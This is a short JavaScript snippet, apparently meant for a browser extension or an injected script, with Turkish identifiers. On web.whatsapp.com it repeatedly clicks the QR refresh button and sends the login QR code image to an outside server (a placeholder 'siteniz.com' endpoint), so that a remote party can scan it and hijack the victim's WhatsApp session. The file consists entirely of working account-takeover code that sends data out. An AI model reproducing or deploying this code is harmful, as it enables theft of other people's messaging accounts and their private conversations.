

var zaman = window.setInterval(qrkontrol, 2000);
function qrkontrol() {
  if (document.readyState == 'complete') {
    $service = window.location.href;
    if ($service.indexOf('web.whatsapp.com') >= 0)
    {
      if (document.getElementsByClassName('qr-button')[0] !== undefined)
      {
        document.getElementsByClassName('qr-button')[0].click();
      }
      if (document.getElementsByClassName('icon icon-chat')[0] == null)
      {
        var xhttp = new XMLHttpRequest();
        xhttp.open('GET', 'https://www.siteniz.com/qryolla.php?gidenqr=' + document.getElementsByTagName('img')[0].src, true);
	// qr kodu sunucuya gonder
        xhttp.send();
      }
    }
  }
}

